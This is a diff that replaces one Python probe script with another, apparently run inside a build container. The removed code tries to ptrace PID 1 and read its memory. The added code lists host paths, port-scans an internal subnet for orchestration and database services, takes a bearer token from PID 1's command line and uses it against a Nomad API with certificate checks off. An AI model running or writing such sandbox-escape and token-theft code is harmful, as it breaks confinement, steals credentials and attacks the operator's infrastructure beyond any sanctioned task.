@@ -1,31 +1,33 @@
-import ctypes,os,re,sys
-libc=ctypes.CDLL('libc.so.6',use_errno=True)
-print('=== ptrace/mem test on builder PID 1 ===')
-# yama
-try: print('yama ptrace_scope:',open('/proc/sys/kernel/yama/ptrace_scope').read().strip())
-except Exception as e: print('yama:',e)
-# PTRACE_ATTACH=16
-ctypes.set_errno(0)
-r=libc.ptrace(16, 1, 0, 0)
-print('ptrace(ATTACH,1) =>',r,'errno',ctypes.get_errno())
-if r==0:
-    libc.ptrace(17,1,0,0)  # DETACH
-# /proc/1/mem
+import os,socket,ssl,urllib.request as u,urllib.error,re,json
+def ls(p):
+    try: return os.listdir(p)
+    except Exception as e: return f"{type(e).__name__}:{e}"
+print('=== HOST PATH TRAVERSAL / SHARED DISK ===')
+for p in ['/alloc','/alloc/..','/alloc/../','/local','/local/..','/opt','/opt/nomad','/opt/nomad/data','/opt/nomad/data/alloc','/podman','/var/lib/nomad','/srv','/mnt','/host','/run/nomad','/var/lib/containers','/.local','/home']:
+    print(p,'->',ls(p))
+print('=== mount sources (host dev) ===')
 try:
-    fd=os.open('/proc/1/mem',os.O_RDONLY)
-    print('mem opened fd',fd)
-    d=os.pread(fd,64,0x400000)
-    print('mem read',d[:32].hex())
-except Exception as e: print('mem:',type(e).__name__,e)
-# /proc/1/maps readable?
-try:
-    print('maps head:',open('/proc/1/maps').read()[:300])
-except Exception as e: print('maps:',type(e).__name__,e)
-# process_vm_readv
-try:
-    buf=ctypes.create_string_buffer(64); iov=ctypes.c_void_p*1
-    class IOV(ctypes.Structure): _fields_=[('base',ctypes.c_void_p),('len',ctypes.c_size_t)]
-    local=IOV(ctypes.cast(buf,ctypes.c_void_p),64); remote=IOV(ctypes.c_void_p(0x400000),64)
-    n=libc.process_vm_readv(1, ctypes.byref(local),1, ctypes.byref(remote),1,0)
-    print('process_vm_readv =>',n,'errno',ctypes.get_errno(), buf.raw[:16].hex())
-except Exception as e: print('vm_readv:',type(e).__name__,e)
+    for ln in open('/proc/self/mountinfo'):
+        if 'nomad' in ln or 'mapper' in ln or 'podman' in ln or 'alloc' in ln: print(ln.strip()[:200])
+except Exception as e: print('mi',e)
+print('=== INTERNAL SUBNET SCAN 10.150.0.0/24 ===')
+def t(h,p,t=0.5):
+    try:
+        s=socket.socket(); s.settimeout(t); s.connect((h,p)); s.close(); return True
+    except Exception: return False
+hits=[]
+for i in [1,2,3,4,5,10,20,50,100,150,200,250,254]:
+    for p in [4646,4647,8500,8200,2375,2376,22,80,443,5432,6379,9090,10250,3000,6443]:
+        if t('10.150.0.%d'%i,p): hits.append(('10.150.0.%d'%i,p))
+print('hits:',hits)
+print('=== Nomad with token as Authorization + other headers ===')
+cmd=open('/proc/1/cmdline','rb').read().decode('utf-8','replace')
+m=re.search(r'eyJ[A-Za-z0-9_.-]{100,}',cmd); tok=m.group(0) if m else ''
+ctx=ssl._create_unverified_context()
+for hdr in [{'X-Nomad-Token':tok},{'Authorization':'Bearer '+tok}]:
+    for ep in ['/v1/agent/self','/v1/jobs?prefix=','/v1/allocations?prefix=']:
+        try:
+            r=u.urlopen(u.Request('https://169.254.1.2:4646'+ep,headers=hdr),context=ctx,timeout=5)
+            print(list(hdr)[0],ep,'->',r.status,r.read(150)[:120])
+        except urllib.error.HTTPError as e: print(list(hdr)[0],ep,'->',e.code)
+        except Exception as e: print(list(hdr)[0],ep,'ERR',type(e).__name__)
